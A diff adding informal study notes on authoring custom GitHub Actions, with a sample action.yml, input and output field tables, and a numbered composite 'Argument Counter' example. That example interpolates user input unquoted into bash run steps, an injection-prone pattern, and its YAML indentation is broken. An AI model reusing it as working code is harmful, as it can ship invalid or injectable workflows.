+- Creating custom actions  Either action.yml or action.yaml is valid.
+
+Anatomy of an action, The action.yml file defines the input, outputs, and configuration for the action. The configuration information includes basic identification information
+
+```
+name: 'Cache'
+description: 'Cache artifacts like dependencies and build outputs to
+ improve workflow execution time'
+author: 'GitHub'
+inputs:
+  path:
+    description: 'A list of files, directories, and wildcard patterns to
+ cache and restore'
+    required: true
+  key:
+    description: 'An explicit key for restoring and saving the cache'
+    required: true
+  restore-keys:
+    description: 'An ordered list of keys to use for restoring stale cache
+ if no cache hit occurred for key. Note `cache-hit` returns false in
+ this case.'
+    required: false
+  upload-chunk-size:
+    description: 'The chunk size used to split up large files during 
+upload, in bytes'
+    required: false
+outputs:
+  cache-hit:
+    description: 'A boolean value to indicate an exact match was found for 
+the primary key'
+runs:
+  using: 'node16'
+  main: 'dist/restore/index.js'
+  post: 'dist/save/index.js'
+  post-if: 'success()'
+branding:
+  icon: 'archive'
+  color: 'gray-dark'
+```
+
+various fields available for an 
+    + input parameters 
+
+Item            Required        Description 
+
+<input_id>      Yes             the name of the input must be unique 
+description     yes             string description 
+required        yes             boolean that indicates if the parameter is required 
+default         optional        default value 
+deprecation     optional        warning message to let users know this parameter is being deprecated 
+
+INPUT_<PARAMETER NAME> with letters converted to uppercase and spaces replaced with underscores.
+
+    + output parameters fields 
+<output_id>     yes         
+description 
+value 
+
+- types of action 
+
+As a composite action that can be implemented with steps and scripting
+As an action that runs within a Docker container
+As an action that is implemented with JavaScript
+
+    + composite action 
+    
+    The use of “($@)” in the script is just to eliminate counting empty strings as arguments.
+    
+```
+1 name: 'Argument Counter'
+2 description: 'Count # of arguments passed in'
+3 inputs:
+4  arguments-to-count: # input id
+5  description: 'arguments to count'
+6   required: true
+7   default: ''
+8 outputs:
+9  arg-count:
+10  description: "Count of arguments passed in"
+11  value: ${{ steps.return-result.outputs.num-args }}
+12 runs:
+13  using: "composite"
+14  steps:
+15  - name: Print arguments if any
+16  run: |
+17    echo Arguments: ${{ inputs.arguments-to-count }}.
+18  shell: bash
+19  - id: return-result
+20  run: |
+21    echo "num-args=`${{ github.action_path }}/count-args.sh ${{ inputs.arguments-to-count }}`" >> $GITHUB_OUTPUT
+22 shell: bash
+```
+
+    + A Docker container action is simply, as the name implies, an action that is encapsulated in a Docker container when it is run
